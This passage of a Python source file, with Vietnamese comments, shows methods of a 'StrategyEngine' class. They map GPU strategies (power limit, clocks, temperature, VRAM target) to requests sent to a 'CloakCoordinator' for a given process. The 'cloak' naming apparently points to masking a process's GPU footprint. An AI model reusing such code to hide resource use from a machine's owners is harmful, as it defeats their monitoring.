                    self.logger.warning(f"⚠️ [StrategyEngine] Failed to apply {strategy_name}: {e}")
            
            # Thu thập post-optimization metrics
            if self.metrics_hub:
                results['metrics']['post'] = self.metrics_hub.get_export_api_data()
            
            self.logger.info(f"✅ [StrategyEngine] Optimization completed: {results['strategies_applied']}")
            return results
            
        except Exception as e:
            self.logger.error(f"❌ [StrategyEngine] Optimization failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'pid': pid,
                'gpu_index': gpu_index
            }
    
    def apply_strategy(self, strategy_name: str, params: Optional[Dict] = None) -> bool:
        """
        Apply một strategy cụ thể với parameters (đồng bộ mapping với orchestrator).
        
        Mapping:
          - 'gpu_power'      → CloakCoordinator.process_request('gpu', power_limit)
          - 'gpu_clock'      → CloakCoordinator.process_request('gpu', sm_clock/memory_clock)
          - 'temperature'    → CloakCoordinator.process_request('gpu', temp_threshold)
          - 'memory'         → CloakCoordinator.process_request('gpu', vram_target)
          - Back-compat: 'gpu_cloak' → 'gpu'; 'power_optimize' → 'gpu_power'; 'memory_optimize' → 'memory'
        """
        try:
            self.logger.info(f"📋 [StrategyEngine] Applying strategy: {strategy_name}")
            params = params or {}
            pid = params.get('pid', os.getpid())
            gpu_index = params.get('gpu_index', 0)

            # Backward compatibility name mapping
            if strategy_name == 'gpu_cloak':
                strategy_name = 'gpu'
            elif strategy_name == 'power_optimize':
                strategy_name = 'gpu_power'
            elif strategy_name == 'memory_optimize':
                strategy_name = 'memory'

            # Build parameter overrides per strategy
            override_params: Dict[str, Any] = {'gpu_index': gpu_index}
            if strategy_name == 'gpu_power':
                override_params['power_limit'] = getattr(self.config, 'gpu_power_limit', 150)
                mapped_strategy = 'gpu'
            elif strategy_name == 'gpu_clock':
                override_params['sm_clock'] = getattr(self.config, 'gpu_sm_clock', 1200)
                override_params['memory_clock'] = getattr(self.config, 'gpu_memory_clock', 877)
                mapped_strategy = 'gpu'
            elif strategy_name == 'temperature':
                override_params['temp_threshold'] = getattr(self.config, 'gpu_temp_threshold', 75)
                mapped_strategy = 'gpu'
            elif strategy_name == 'memory':
                # Target VRAM ratio (0..1). Dùng default nếu config không có.
                override_params['vram_target'] = getattr(self.config, 'gpu_vram_target', 0.5)
                mapped_strategy = 'gpu'
            elif strategy_name == 'gpu':
                mapped_strategy = 'gpu'
            else:
                self.logger.warning(f"⚠️ [StrategyEngine] Unknown strategy: {strategy_name}")
                return False

            # Compose CloakRequest và forward qua CloakCoordinator
            request = CloakRequest(
                pid=pid,
                strategy_name=mapped_strategy,
                params=override_params,
                metadata={'source': 'strategy_engine'}
            )
            result = self.cloak_coordinator.process_request(request)
            return bool(getattr(result, 'success', False))

        except Exception as e:
            self.logger.error(f"❌ [StrategyEngine] Failed to apply {strategy_name}: {e}")
            return False
    
    def shutdown(self):
        """Cleanup resources khi shutdown."""
        try:
            if hasattr(self, 'cloak_coordinator'):
                # Cleanup coordinator resources
                pass
            self.logger.info("✅ [StrategyEngine] Shutdown completed")
        except Exception as e:
            self.logger.error(f"❌ [StrategyEngine] Shutdown error: {e}")
